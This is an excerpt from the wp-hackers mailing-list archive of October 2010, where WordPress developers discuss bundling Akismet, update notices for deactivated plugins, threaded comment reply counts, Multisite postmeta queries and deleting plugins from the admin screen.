>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
>> 
>> --
>> http://ozh.org/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Sat Oct  2 20:50:23 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 2 Oct 2010 16:50:23 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <4CA78BD4.2010707@elfden.co.uk>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>	<28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>	<AANLkTinuxokmiUPOzW8XPi1XvKxFCXJiZc_cSOthY+6n@mail.gmail.com>
	<9F03882C-33D3-4035-8848-04C54C017449@newclarity.net>
	<4CA78BD4.2010707@elfden.co.uk>
Message-ID: <CFF6A40F-6D15-4978-B59A-11C1A1DAE06E@newclarity.net>

On Oct 2, 2010, at 3:45 PM, Rich Pedley wrote:
> I'd like to keep the notifications for the deactivated ones as well. there could be any number of reasons why a plugin is deactivated, including not working with the current version. So a user may be waiting for that plugin to be activated.
> 
> therefore a hook to enable the hiding of the notifications for deactivated plugins would be better IMO.
> 
> But please leave it on by default.

Fair point.  So a better solution for both (which I implied in my email) is to add an "archived" status.  (I wrote a plugin for this albeit it's a hack (because of lack of needed hooks) and wouldn't be a good starting point.)

-Mike

From rbilesky at gmail.com  Sat Oct  2 21:17:31 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Sat, 2 Oct 2010 14:17:31 -0700
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>
Message-ID: <AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>

Akismet still offers free person api keys
https://akismet.com/signup/#free-api-key

On Sat, Oct 2, 2010 at 1:49 PM, Joel Fisher <joelfisher at gmail.com> wrote:

> Akismet isn't free anymore. Check it out. I use my old API key which still
> works but their site references payment.
>
>
> Sent from my iPhone
>
> On Oct 2, 2010, at 12:25 PM, Otto <otto at ottodestruct.com> wrote:
>
> > An "external" in SVN terms is simply a chunk of code that is directly
> > included from some other SVN repository. That way, when Akismet
> > updates, then they don't have to reimport it into the WordPress trunk
> > or get the updates or anything like that. It's just automatically
> > included.
> >
> > Externals are ways to combine pieces of code from other projects
> > without having to constantly refresh them manually.
> >
> > -Otto
> >
> >
> >
> > On Sat, Oct 2, 2010 at 10:26 AM, Ozh <ozh at ozh.org> wrote:
> >> While we're on this subject, if anyone has a good explanation on why
> >> Akismet is an "external", I'd be grateful. I don't get why parts of WP
> >> are, well, parts of WP, while other parts of WP are "externals". From
> >> a user POV this does not make a lot of sense IMO.
> >>
> >> On Sat, Oct 2, 2010 at 5:12 PM, Eric Mann <eric at eamann.com> wrote:
> >>> I've just become very sensitive to anything asking me to update
> immediately
> >>> after I install what I'm told is the latest version.  It's a bit
> confusing
> >>> to download a fresh file, install it, and immediately see any kind of
> >>> "update available" message.
> >>>
> >>> No, I like the idea of including the plugin with WordPress core ... but
> it
> >>> would be nice if we could somehow update the core download package (the
> ZIP
> >>> file you get when clicking "download" on wordpress.org) when externals
> are
> >>> updated.
> >>>
> >>>> Many software distributions, once installed will check if there was an
> >>> update.  This is pretty common practice from what I've seen.
> >>>
> >>> Just because it's a common practice doesn't mean it's the right way to
> do
> >>> things or something we should embrace.  Anything that can potentially
> >>> confuse a user is "bad" in my book, common practice or no ...
> >>>
> >>> ~Eric
> >>>
> >>> -----Original Message-----
> >>> From: wp-hackers-bounces at lists.automattic.com
> >>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Paul
> >>> Sent: Saturday, October 02, 2010 7:21 AM
> >>> To: wp-hackers at lists.automattic.com
> >>> Subject: Re: [wp-hackers] Bundled Plug-ins
> >>>
> >>>
> >>> On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:
> >>>
> >>>> conjurs up flashbacks of the endless
> >>>> update-reboot-update-reboot cycle that drives many people away from
> >>>> Microsoft Windows.
> >>>
> >>> Really? That is a little dramatic I think. The Akismet upgrade doesn't
> force
> >>> you to reboot your server or anything close.
> >>>
> >>> Would you rather have the plugin excluded from the WordPress core? Then
> you
> >>> would need to download and install it separate. Many software
> distributions,
> >>> once installed will check it there was an update. This is pretty common
> >>> practice from what I've seen.
> >>>
> >>>
> >>> P-
> >>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >>
> >>
> >>
> >> --
> >> http://ozh.org/
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tonys at tonyscott.org.uk  Sat Oct  2 23:16:45 2010
From: tonys at tonyscott.org.uk (Tony Scott)
Date: Sun, 3 Oct 2010 00:16:45 +0100 (BST)
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>
	<AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>
Message-ID: <594250.85542.qm@web24501.mail.ird.yahoo.com>

This is the page for getting the free API key

http://akismet.com/personal/

 --
Tony Scott
http://tonyscott.org.uk | http://twitter.com/tonys | http://uk.wordcamp.org



----- Original Message ----
> From: Ryan Bilesky <rbilesky at gmail.com>
> To: wp-hackers at lists.automattic.com
> Sent: Sat, 2 October, 2010 22:17:31
> Subject: Re: [wp-hackers] Bundled Plug-ins
> 
> Akismet still offers free person api keys
> https://akismet.com/signup/#free-api-key
> 
> On Sat, Oct 2, 2010 at 1:49  PM, Joel Fisher <joelfisher at gmail.com>  wrote:
> 
> > Akismet isn't free anymore. Check it out. I use my old API  key which still
> > works but their site references  payment.
> >
> >
> > Sent from my iPhone
> >
> > On Oct 2,  2010, at 12:25 PM, Otto <otto at ottodestruct.com>  wrote:
> >
> > > An "external" in SVN terms is simply a chunk of code  that is directly
> > > included from some other SVN repository. That way,  when Akismet
> > > updates, then they don't have to reimport it into the  WordPress trunk
> > > or get the updates or anything like that. It's just  automatically
> > > included.
> > >
> > > Externals are  ways to combine pieces of code from other projects
> > > without having  to constantly refresh them manually.
> > >
> > > -Otto
> >  >
> > >
> > >
> > > On Sat, Oct 2, 2010 at 10:26 AM, Ozh  <ozh at ozh.org> wrote:
> > >> While  we're on this subject, if anyone has a good explanation on why
> > >>  Akismet is an "external", I'd be grateful. I don't get why parts of WP
> >  >> are, well, parts of WP, while other parts of WP are "externals".  From
> > >> a user POV this does not make a lot of sense IMO.
> >  >>
> > >> On Sat, Oct 2, 2010 at 5:12 PM, Eric Mann <eric at eamann.com> wrote:
> >  >>> I've just become very sensitive to anything asking me to  update
> > immediately
> > >>> after I install what I'm told is  the latest version.  It's a bit
> > confusing
> > >>> to  download a fresh file, install it, and immediately see any kind of
> >  >>> "update available" message.
> > >>>
> >  >>> No, I like the idea of including the plugin with WordPress core ...  
but
> > it
> > >>> would be nice if we could somehow update the  core download package (the
> > ZIP
> > >>> file you get when  clicking "download" on wordpress.org) when externals
> > are
> >  >>> updated.
> > >>>
> > >>>> Many  software distributions, once installed will check if there was an
> >  >>> update.  This is pretty common practice from what I've  seen.
> > >>>
> > >>> Just because it's a common  practice doesn't mean it's the right way to
> > do
> > >>>  things or something we should embrace.  Anything that can  potentially
> > >>> confuse a user is "bad" in my book, common  practice or no ...
> > >>>
> > >>> ~Eric
> >  >>>
> > >>> -----Original Message-----
> >  >>> From: wp-hackers-bounces at lists.automattic.com
> >  >>> [mailto:wp-hackers-bounces at lists.automattic.com]  On Behalf Of Paul
> > >>> Sent: Saturday, October 02, 2010 7:21  AM
> > >>> To: wp-hackers at lists.automattic.com
> >  >>> Subject: Re: [wp-hackers] Bundled Plug-ins
> >  >>>
> > >>>
> > >>> On Oct 2, 2010, at 10:05  AM, Eric Mann wrote:
> > >>>
> > >>>> conjurs up  flashbacks of the endless
> > >>>> update-reboot-update-reboot  cycle that drives many people away from
> > >>>> Microsoft  Windows.
> > >>>
> > >>> Really? That is a little  dramatic I think. The Akismet upgrade doesn't
> > force
> > >>>  you to reboot your server or anything close.
> > >>>
> >  >>> Would you rather have the plugin excluded from the WordPress core?  
Then
> > you
> > >>> would need to download and install it  separate. Many software
> > distributions,
> > >>> once  installed will check it there was an update. This is pretty common
> >  >>> practice from what I've seen.
> > >>>
> >  >>>
> > >>> P-
> > >>>
> > >>>  _______________________________________________
> > >>> wp-hackers  mailing list
> > >>> wp-hackers at lists.automattic.com
> >  >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >  >>>
> > >>>  _______________________________________________
> > >>> wp-hackers  mailing list
> > >>> wp-hackers at lists.automattic.com
> >  >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >  >>>
> > >>
> > >>
> > >>
> > >>  --
> > >> http://ozh.org/
> > >>  _______________________________________________
> > >> wp-hackers  mailing list
> > >> wp-hackers at lists.automattic.com
> >  >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >  >>
> > > _______________________________________________
> >  > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> >  > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >  _______________________________________________
> > wp-hackers mailing  list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers  mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


      

From wp at andrewnacin.com  Sun Oct  3 04:17:16 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sun, 3 Oct 2010 00:17:16 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <594250.85542.qm@web24501.mail.ird.yahoo.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>
	<AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>
	<594250.85542.qm@web24501.mail.ird.yahoo.com>
Message-ID: <AANLkTimL=EoeGm4TNbtEEAPSWaW3AptdtiJA07mJKZ+Y@mail.gmail.com>

1. Akismet is free for personal use.

2. Regarding hiding the update nags for deactivated plugins: I've suggested
this before, but the explanation I received was enough to cause me to flip
my opinion completely. Some people will deactivate a plugin (or switch away
from a theme, I guess) specifically because they are waiting for an update.
I see no reason to offer an option in core to hide such nags. We want people
to stay current.

3. I really do like the idea of latest.zip being re-bundled whenever a new
version of Akismet or Twenty Ten is released. Feasible as Akismet is an
external, but not feasible for Twenty Ten as it is not. OTOH, tags should be
atomic, so I'm not really sure about whether it makes sense. I'll mention it
to some of the other core devs.

4. Akismet is a plugin, and that is why it is on plugins Trac/SVN instead of
core Trac/SVN. It is bundled, I grant you, because spam is a huge issue and
Akismet solved a very important need when it was introduced. Having it on
its own repository allows for its own release cycle. Twenty Ten is likewise
on themes SVN because it can have its own release cycle. (We'll likely be
releasing a new version soon that fixes some image styling issues, and works
around an IE9 bug.)

From mikeschinkel at newclarity.net  Sun Oct  3 07:08:20 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 3 Oct 2010 03:08:20 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTimL=EoeGm4TNbtEEAPSWaW3AptdtiJA07mJKZ+Y@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>
	<AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>
	<594250.85542.qm@web24501.mail.ird.yahoo.com>
	<AANLkTimL=EoeGm4TNbtEEAPSWaW3AptdtiJA07mJKZ+Y@mail.gmail.com>
Message-ID: <00BF7D74-9F76-443B-B087-32A500FF0D48@newclarity.net>

On Oct 3, 2010, at 12:17 AM, Andrew Nacin wrote:
> 2. Regarding hiding the update nags for deactivated plugins: I've suggested
> this before, but the explanation I received was enough to cause me to flip
> my opinion completely. Some people will deactivate a plugin (or switch away
> from a theme, I guess) specifically because they are waiting for an update.
> I see no reason to offer an option in core to hide such nags. We want people
> to stay current.

Fair point for deactivated plugins, but the logic doesn't hold for "archived" plugins, assuming such an option existed. FWIW.

-Mike


From peter.westwood at ftwr.co.uk  Sun Oct  3 08:40:01 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sun, 3 Oct 2010 09:40:01 +0100
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTimL=EoeGm4TNbtEEAPSWaW3AptdtiJA07mJKZ+Y@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>
	<AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>
	<594250.85542.qm@web24501.mail.ird.yahoo.com>
	<AANLkTimL=EoeGm4TNbtEEAPSWaW3AptdtiJA07mJKZ+Y@mail.gmail.com>
Message-ID: <3BBB4FAA-AD08-4DA5-9110-86ADCBFDE826@ftwr.co.uk>


On 3 Oct 2010, at 05:17, Andrew Nacin wrote:

> 1. Akismet is free for personal use.
> 
> 2. Regarding hiding the update nags for deactivated plugins: I've suggested
> this before, but the explanation I received was enough to cause me to flip
> my opinion completely. Some people will deactivate a plugin (or switch away
> from a theme, I guess) specifically because they are waiting for an update.
> I see no reason to offer an option in core to hide such nags. We want people
> to stay current.
> 
> 3. I really do like the idea of latest.zip being re-bundled whenever a new
> version of Akismet or Twenty Ten is released. Feasible as Akismet is an
> external, but not feasible for Twenty Ten as it is not. OTOH, tags should be
> atomic, so I'm not really sure about whether it makes sense. I'll mention it
> to some of the other core devs.
> 
> 4. Akismet is a plugin, and that is why it is on plugins Trac/SVN instead of
> core Trac/SVN. It is bundled, I grant you, because spam is a huge issue and
> Akismet solved a very important need when it was introduced. Having it on
> its own repository allows for its own release cycle. Twenty Ten is likewise
> on themes SVN because it can have its own release cycle. (We'll likely be
> releasing a new version soon that fixes some image styling issues, and works
> around an IE9 bug.)

If we were to rebuild the zip everytime a new version of akismet / twentyten was released then we would have to release a new version of WordPress everytime that happens

That just links them together in such a way that is not productive.

The best solution here IMHO would be for the "5 Minute install" to detect that the upgrades are needed at install time and to do the upgrades as part of the install transparently

This is the best solution - we don't have to keep rebuilding the zips, the users gets the latest version at install, the user doesn't get annoyed by upgrades straight after install.

If anyone would care to patch this it would be really great :-)

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From ashishsainiashfame at gmail.com  Sun Oct  3 10:12:31 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 3 Oct 2010 15:42:31 +0530
Subject: [wp-hackers] Replies count
In-Reply-To: <AANLkTim1_PQeHGCxTJs=rVOHRFpogVvfr4p4_tg8smJt@mail.gmail.com>
References: <AANLkTik-cM5GEf1yXT7zErD=s3SQe6SyAffPQbUdm2e0@mail.gmail.com>
	<AANLkTinEAvTqZOYrnD3fCvYeG+n8S0E1ig5k_ByO4Gi2@mail.gmail.com>
	<AANLkTik9Xcqf3EQ+T7g6Q_xyERdDfeiVZ4s_EvGgKsof@mail.gmail.com>
	<AANLkTim1_PQeHGCxTJs=rVOHRFpogVvfr4p4_tg8smJt@mail.gmail.com>
Message-ID: <AANLkTikUTZn19vWW3sUWFP1q647TtmCV6YJ9jCVOQZQM@mail.gmail.com>

Hi Mike,

Your code works fine but I spotted two things, which are:

   - The reply_count was not filling up. I think earlier saw them holding
   the right value but not now. The replies array gets filled up correctly
   though.
   - The code even account for comments pending approval too.

I also build up the numbering functionality on threaded comments using data
build up by your code :)
Thanks a bunch!

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Sep 27, 2010 at 2:20 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Thanks Mike!
>
> I will try that and let you know how good it goes :)
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter : http://twitter.com/ashfame
>
>
> On Fri, Sep 24, 2010 at 12:55 AM, Ashish Saini <
> ashishsainiashfame at gmail.com> wrote:
>
>> Now I even need to list them as
>> - 1
>> -- 1.1
>> --- 1.2
>> - 2
>> - 3
>>
>> Any ideas about this?
>>
>> Thanks & Regards
>> Ashish Saini aka Ashfame
>> (Deserve Before You Desire)
>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter : http://twitter.com/ashfame
>>
>>
>> On Thu, Sep 23, 2010 at 5:53 PM, scribu <mail at scribu.net> wrote:
>>
>>> On Thu, Sep 23, 2010 at 12:55 PM, Ashish Saini <
>>> ashishsainiashfame at gmail.com
>>> > wrote:
>>>
>>> > Hello everyone,
>>> >
>>> > I was wondering what would be an easy solution to achieve the number of
>>> > replies a comment has get in a threaded comment.
>>> > Is that something I can do in the comments callback function or
>>> something I
>>> > would need to do by jquery by counting the li's in the children class
>>> > inside
>>> > it.
>>> >
>>>
>>> If you want an easy way, I would go with the jQuery method.
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>

From ashishsainiashfame at gmail.com  Sun Oct  3 10:15:40 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 3 Oct 2010 15:45:40 +0530
Subject: [wp-hackers] Traversing tables in Multisite
Message-ID: <AANLkTimwyx8nSBC56KEovrobmTJtAW8+U+o+Tq1em54=@mail.gmail.com>

Hi,

I need to aggregate some data from postmeta of a Multisite but I am not sure
about how should I go on doing that for all the postmeta tables in the blog.
Any pointers?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame

From ashishsainiashfame at gmail.com  Sun Oct  3 10:20:33 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 3 Oct 2010 15:50:33 +0530
Subject: [wp-hackers] Traversing tables in Multisite
In-Reply-To: <AANLkTimwyx8nSBC56KEovrobmTJtAW8+U+o+Tq1em54=@mail.gmail.com>
References: <AANLkTimwyx8nSBC56KEovrobmTJtAW8+U+o+Tq1em54=@mail.gmail.com>
Message-ID: <AANLkTim+LLFPp3-OW+FGMprScwPzuMBpZEx2Oy+YeTCK@mail.gmail.com>

Is there a better way of doing it other than by getting all the names in an
array SHOW TABLES LIKE 'wp%postmeta' and then doing a query on each of it.

I will be using transient APIs so doesn't matter how heavy this can be but
still I want a optimal solution.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Sun, Oct 3, 2010 at 3:45 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Hi,
>
> I need to aggregate some data from postmeta of a Multisite but I am not
> sure about how should I go on doing that for all the postmeta tables in the
> blog.
> Any pointers?
>
> Thanks & Regards
>  Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter : http://twitter.com/ashfame
>

From eric at eamann.com  Sun Oct  3 15:10:06 2010
From: eric at eamann.com (Eric Mann)
Date: Sun, 3 Oct 2010 08:10:06 -0700
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <3BBB4FAA-AD08-4DA5-9110-86ADCBFDE826@ftwr.co.uk>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>	<001001cb6244$2f30b310$8d921930$@com>	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>	<E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>	<AANLkTik6cVT_owTk_u+eFtEdqx00FdPs8DYfqxwfUcDA@mail.gmail.com>	<594250.85542.qm@web24501.mail.ird.yahoo.com>	<AANLkTimL=EoeGm4TNbtEEAPSWaW3AptdtiJA07mJKZ+Y@mail.gmail.com>
	<3BBB4FAA-AD08-4DA5-9110-86ADCBFDE826@ftwr.co.uk>
Message-ID: <002701cb630d$11a65830$34f30890$@com>

+1 on updating the external plugin automatically ... the only issue here is
when (for one reason or another) the blog can't use the auto upgrade
feature.  I have yet to get this to work on a PHP4-powered site.  And some
server setups require you to enter your FTP information each time anything
is downloaded.  A transparent update wouldn't work there.

What about "including" Akismet the same way the blog importers are
"included?"  They aren't bundled functionality, but are still called out
explicitly with a relatively painless download/activation link.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter Westwood
Sent: Sunday, October 03, 2010 1:40 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Bundled Plug-ins


On 3 Oct 2010, at 05:17, Andrew Nacin wrote:

> 1. Akismet is free for personal use.
> 
> 2. Regarding hiding the update nags for deactivated plugins: I've
suggested
> this before, but the explanation I received was enough to cause me to flip
> my opinion completely. Some people will deactivate a plugin (or switch
away
> from a theme, I guess) specifically because they are waiting for an
update.
> I see no reason to offer an option in core to hide such nags. We want
people
> to stay current.
> 
> 3. I really do like the idea of latest.zip being re-bundled whenever a new
> version of Akismet or Twenty Ten is released. Feasible as Akismet is an
> external, but not feasible for Twenty Ten as it is not. OTOH, tags should
be
> atomic, so I'm not really sure about whether it makes sense. I'll mention
it
> to some of the other core devs.
> 
> 4. Akismet is a plugin, and that is why it is on plugins Trac/SVN instead
of
> core Trac/SVN. It is bundled, I grant you, because spam is a huge issue
and
> Akismet solved a very important need when it was introduced. Having it on
> its own repository allows for its own release cycle. Twenty Ten is
likewise
> on themes SVN because it can have its own release cycle. (We'll likely be
> releasing a new version soon that fixes some image styling issues, and
works
> around an IE9 bug.)

If we were to rebuild the zip everytime a new version of akismet / twentyten
was released then we would have to release a new version of WordPress
everytime that happens

That just links them together in such a way that is not productive.

The best solution here IMHO would be for the "5 Minute install" to detect
that the upgrades are needed at install time and to do the upgrades as part
of the install transparently

This is the best solution - we don't have to keep rebuilding the zips, the
users gets the latest version at install, the user doesn't get annoyed by
upgrades straight after install.

If anyone would care to patch this it would be really great :-)

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From chris at clwill.com  Sun Oct  3 16:29:20 2010
From: chris at clwill.com (Chris Williams)
Date: Sun, 3 Oct 2010 12:29:20 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <00BF7D74-9F76-443B-B087-32A500FF0D48@newclarity.net>
Message-ID: <C8CDFD70.636A4%chris@clwill.com>

This is really the point.  If there were a clean way in the UI to "remove" a plugin (a step beyond deactivating) that would be great.  I have two sites with old, no longer used plugins that are producing update nags even though they are long since not used.  It's just a PITA to have to go into an FTP program and get rid of the directory.  Would be neat to have some UI in the plugin admin interface to remove them.

________________________________
From: Mike Schinkel <mikeschinkel at newclarity.net>
Date: Sun, 3 Oct 2010 03:08:20 -0400
Subject: Re: [wp-hackers] Bundled Plug-ins

Fair point for deactivated plugins, but the logic doesn't hold for "archived" plugins, assuming such an option existed. FWIW.

From eric at eamann.com  Sun Oct  3 16:43:28 2010
From: eric at eamann.com (Eric Mann)
Date: Sun, 3 Oct 2010 09:43:28 -0700 (PDT)
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <C8CDFD70.636A4%chris@clwill.com>
References: <00BF7D74-9F76-443B-B087-32A500FF0D48@newclarity.net>
	<C8CDFD70.636A4%chris@clwill.com>
Message-ID: <662890110.826964.1286124208302.JavaMail.open-xchange@oxusltgw11.schlund.de>

There actually *is* a UI interface to remove plugins ... but it only works for
*deactivated* plugins (if they're active, you have to deactivate them first
before you can remove them).
?
But "Delete Plugin" will remove the files and folders from the `/plugins/`
directory without the need to use FTP.

On October 3, 2010 at 4:29 PM Chris Williams <chris at clwill.com> wrote:

> This is really the point.? If there were a clean way in the UI to "remove" a
> plugin (a step beyond deactivating) that would be great.? I have two sites
> with old, no longer used plugins that are producing update nags even though
> they are long since not used.? It's just a PITA to have to go into an FTP
> program and get rid of the directory.? Would be neat to have some UI in the
> plugin admin interface to remove them.
>
> ________________________________
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Date: Sun, 3 Oct 2010 03:08:20 -0400
> Subject: Re: [wp-hackers] Bundled Plug-ins
>
> Fair point for deactivated plugins, but the logic doesn't hold for "archived"
> plugins, assuming such an option existed. FWIW.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From chris at clwill.com  Sun Oct  3 16:51:21 2010
From: chris at clwill.com (Chris Williams)
Date: Sun, 3 Oct 2010 12:51:21 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <662890110.826964.1286124208302.JavaMail.open-xchange@oxusltgw11.schlund.de>
Message-ID: <C8CE0299.636AA%chris@clwill.com>

Foot in mouth.  Hadn't been back to these two sites in so long, I missed it.

To quote Roseanne Rosannadanna: "nevermind".  :)


________________________________
From: Eric Mann <eric at eamann.com>
Reply-To: <wp-hackers at lists.automattic.com>
Date: Sun, 3 Oct 2010 12:43:28 -0400
To: <wp-hackers at lists.automattic.com>
Subject: Re: [wp-hackers] Bundled Plug-ins

There actually *is* a UI interface to remove plugins ... but it only works for
*deactivated* plugins (if they're active, you have to deactivate them first
before you can remove them).

But "Delete Plugin" will remove the files and folders from the `/plugins/`
directory without the need to use FTP.

From rollervegan at gmail.com  Sun Oct  3 19:17:35 2010
From: rollervegan at gmail.com (Johnathan)
Date: Sun, 3 Oct 2010 12:17:35 -0700
Subject: [wp-hackers] Fixed issue with mobile site compatibility
Message-ID: <AANLkTimEYMsUeE7DJ439CwFR41D=F62btAfotTGhVnu_@mail.gmail.com>

Hi,

I found and fixed an issue in Wordpress: If you have a mobile version of
your site on a different subdomain (ie, m.mydomain.com), all pages for
single posts send a 301 redirect to the www. version of the site, instead of
staying on the mobile site.

For example, you have two aliases for your website:

